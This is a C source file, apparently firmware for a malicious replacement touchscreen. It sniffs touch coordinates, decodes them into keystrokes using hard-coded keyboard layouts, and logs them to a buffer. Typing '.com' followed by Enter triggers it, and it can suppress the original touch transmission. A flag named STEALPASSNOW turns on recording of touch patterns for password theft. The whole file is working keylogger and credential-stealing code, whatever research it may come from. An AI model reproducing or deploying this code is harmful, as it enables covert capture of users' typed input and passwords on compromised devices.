#include "sniff.h"
#include <math.h>
// Flag for starting the steal pass checking - ugly hack
//#define STEALPASSNOW


static Keyboard keyboardInstance =
{ .layout1 =
{
		{ 'q', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'w', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'e', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'r', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 't', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'y', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'u', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  7, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'i', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 7, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  8, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'o', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 8, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH *  9, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'p', KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 9, KEYBOARD1_LINE1_X_OFFSET + CHARACTER_WIDTH * 10, KEYBOARD1_LINE1_Y_OFFSET, KEYBOARD1_LINE2_Y_OFFSET },
		{ 'a', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 's', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'd', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'f', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'g', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'h', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'j', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  7, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'k', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 7, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  8, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'l', KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH * 8, KEYBOARD1_LINE2_X_OFFSET + CHARACTER_WIDTH *  9, KEYBOARD1_LINE2_Y_OFFSET, KEYBOARD1_LINE3_Y_OFFSET },
		{ 'z', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'x', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'c', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'v', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'b', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'n', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ 'm', KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD1_LINE3_X_OFFSET + CHARACTER_WIDTH *  7, KEYBOARD1_LINE3_Y_OFFSET, KEYBOARD1_LINE4_Y_OFFSET },
		{ ' ', 380, 1055, 2192, 2335 },
		{ '.', 1070, 1238, 2190, 2353 },
		{ '\n', 1238, 1440, 2190, 2353 },
		{ NEXT_KEYBOARD_KEY_ID, 27, 219, 2196, 2340 } },

		.layout2 =
		{
		{  '1', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '2', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '3', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '4', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '5', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '6', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '7', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  7, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '8', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 7, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  8, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '9', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 8, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH *  9, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '0', KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 9, KEYBOARD2_LINE1_X_OFFSET + CHARACTER_WIDTH * 10, KEYBOARD2_LINE1_Y_OFFSET, KEYBOARD2_LINE2_Y_OFFSET },
		{  '@', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '#', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '$', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '_', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '&', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '-', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '+', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  7, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '(', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 7, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  8, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  ')', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 8, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH *  9, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '/', KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 9, KEYBOARD2_LINE2_X_OFFSET + CHARACTER_WIDTH * 10, KEYBOARD2_LINE2_Y_OFFSET, KEYBOARD2_LINE3_Y_OFFSET },
		{  '*', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 0, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  0, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{  '"', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 1, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  1, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{ '\'', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 2, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  2, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{  ':', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 3, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  3, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{  ';', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 4, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  4, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{  '!', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 5, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  5, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{  '?', KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH * 6, KEYBOARD2_LINE3_X_OFFSET + CHARACTER_WIDTH *  6, KEYBOARD2_LINE3_Y_OFFSET, KEYBOARD2_LINE4_Y_OFFSET },
		{ NEXT_KEYBOARD_KEY_ID, 10, 205, 1940, 2190 },
		{ PREV_KEYBOARD_KEY_ID, 27, 219, 2196, 2340 } }

};

static uint8_t keylogBuff[KEYLOG_BUFF_SIZE];
static uint8_t keylogBuffStart = 0;
static uint8_t keylogBuffEnd = 0;

/* TRIGGER */
const static uint8_t searchedString[] = ".com\n";

static uint16_t last_touch[2] = { 0, 0 };
static uint8_t keyboardState = 0;

static uint16_t records[2 * PASSWORD_RECORD_SIZE];
static uint8_t currentRecordIndex = 0;
static uint8_t touch_rest = 1;

static uint8_t getLetter(uint32_t x, uint32_t y)
{
	uint8_t letter = 0;
	Letter* db = 0;
	uint32_t size = 0;
	if (keyboardState == 0)
	{
		db = keyboardInstance.layout1;
		size = KEYBOARD1_SIZE;
	} else if (keyboardState == 1)
	{
		db = keyboardInstance.layout2;
		size = KEYBOARD2_SIZE;
	}
	for (uint32_t i = 0; i < size; i++)
	{
		Letter currentletter = db[i];
		uint32_t x0 = currentletter.x0;
		uint32_t x1 = currentletter.x1;
		uint32_t y0 = currentletter.y0;
		uint32_t y1 = currentletter.y1;
		if (x0 <= x && x <= x1 && y0 <= y && y <= y1)
		{
			letter = currentletter.letter;
			break;
		}
	}
	return letter;
}


static uint16_t computeCoord(uint8_t lsb, uint8_t msb)
{
	return (lsb + (((uint16_t) msb) << 8));
}

static uint8_t checkBuffer()
{
	for(int16_t i = sizeof(searchedString) - 2; i >= 0; i--)
	{
		int16_t j = (keylogBuffEnd - sizeof(searchedString) + i + 1) % KEYLOG_BUFF_SIZE;
		if(keylogBuff[j] != searchedString[i])
		{
			return 0;
		}
	}
	return 1;
}


static uint8_t drastic(uint16_t x , uint16_t y)
{
	uint16_t d = 0;
	for(int i = 0 ; i < 8 && currentRecordIndex*2 - 4*2 >= 0 ; i+=2)
	{
		if(x==0 && y==0)
		{
			continue;
		}
		uint16_t distance = (uint16_t) sqrt(
				(uint16_t) pow((double)(x-records[(2*currentRecordIndex)-i]),2) +
				(uint16_t) pow((double)(y-records[(2*currentRecordIndex)-i+1]),2)
				);
		if(d <  distance)
			d = distance;
	}
	if(currentRecordIndex < 4)
	{
		return 1;
	}
	if(d > THRESHOLD)
	{
		return 1;
	}
	return 0;
}

void sniffer_init()
{
	keylogBuffStart = 0;
	keylogBuffEnd = 0;

	memset(last_touch, 0, sizeof(last_touch));
	keyboardState = 0;

	memset(records, 0, sizeof(records));
	currentRecordIndex = 0;
	touch_rest = 1;
}

uint8_t getLetterFromBuff(uint8_t index)
{
	return keylogBuff[(keylogBuffStart + index) % KEYLOG_BUFF_SIZE];
}

uint32_t hasInjection(uint8_t addr, uint8_t len, const uint8_t* buff, uint8_t* allowTransmission)
{
	if (addr == 0x08)
	{
		uint16_t x = computeCoord(buff[1], buff[2]);
		uint16_t y = computeCoord(buff[3], buff[4]);

#ifdef STEALPASSNOW
		if(recordTouches(x, y))
		{
			return 2;
		}
#endif

		//uint8_t letter = getLetter(x,y);
		if (x == 0 && y == 0)
		{
			x = last_touch[0];
			y = last_touch[1];


			uint8_t letter = getLetter(last_touch[0], last_touch[1]);
			if (letter == NEXT_KEYBOARD_KEY_ID)
			{
				keyboardState = (keyboardState + 1) % LAYOUT_COUNT;
			}

			else if (letter == PREV_KEYBOARD_KEY_ID)
			{
				keyboardState = (keyboardState - 1) % LAYOUT_COUNT;
			} else if (letter == 0)
			{
				/*
				 keyboardState = 0;
				 press_counting = 0;
				 buffer_size = 0;
				 last_touch[0] = 0;
				 last_touch[1] = 0;*/
				resetBuffer();
			}

			if (letter && (letter != NEXT_KEYBOARD_KEY_ID) && (letter != PREV_KEYBOARD_KEY_ID))
			{
				printf("Found letter %c\r\n", letter);

				if (letter != '\n'){
					keylogBuff[keylogBuffEnd++] = letter;
					keylogBuffEnd %= KEYLOG_BUFF_SIZE;
					/* We reached to the end of our bycle buffer -> delete the farest one */
					if(keylogBuffEnd == keylogBuffStart)
					{
						keylogBuffStart++;
						keylogBuffStart %= KEYLOG_BUFF_SIZE;
					}
				}

				last_touch[0] = 0;
				last_touch[1] = 0;

				uint32_t ans = checkBuffer(keylogBuff);

				return ans;
			}
		}
		else
		{
			last_touch[0] = x;
			last_touch[1] = y;
			if(getLetter(x,y)=='\n')
			{
					keylogBuff[keylogBuffEnd++] = getLetter(x,y);
					keylogBuffEnd %= KEYLOG_BUFF_SIZE;
					if(keylogBuffEnd == keylogBuffStart)
					{
						keylogBuffStart++;
						keylogBuffStart %= KEYLOG_BUFF_SIZE;
					}
					if (checkBuffer(keylogBuff))
					{
						*allowTransmission =0;
						return 1;
					}
			}

		}
	}
	return 0;
}

uint16_t* getPwdBuffer()
{
	return records;
}

uint8_t recordTouches(uint16_t x, uint16_t y)
{
	printf("\n\rcurrentRecordIndex = %d",currentRecordIndex);
//	printf("x %d y %d",x,y);
	if(currentRecordIndex<PASSWORD_RECORD_SIZE){
		if(!touch_rest){
			if(x == 0 && y == 0){
				touch_rest = 1;
				records[currentRecordIndex*2] = 0;
				records[(currentRecordIndex*2) + 1] = 0;
				currentRecordIndex++;
			}else{
				if(drastic(x,y)){
					records[currentRecordIndex*2] = x;
					records[(currentRecordIndex*2) + 1] = y;
					currentRecordIndex++;
				}
			}
		}else{
			if(x != 0 || y != 0){
				touch_rest = 0;
				records[currentRecordIndex*2] = x;
				records[(currentRecordIndex*2) + 1] = y;
				currentRecordIndex++;
			}else{
				// DO NOTHING
			}
		}
		return 0;
	}else{
		return 1;
	}
}

void resetBuffer()
{
	keylogBuffEnd = keylogBuffStart;
}

uint8_t getTypedSize()
{
	if(keylogBuffStart < keylogBuffEnd){
		return keylogBuffEnd - keylogBuffStart + 1;
	} else {
		return (KEYLOG_BUFF_SIZE - keylogBuffStart) + keylogBuffEnd + 1;
	}
}
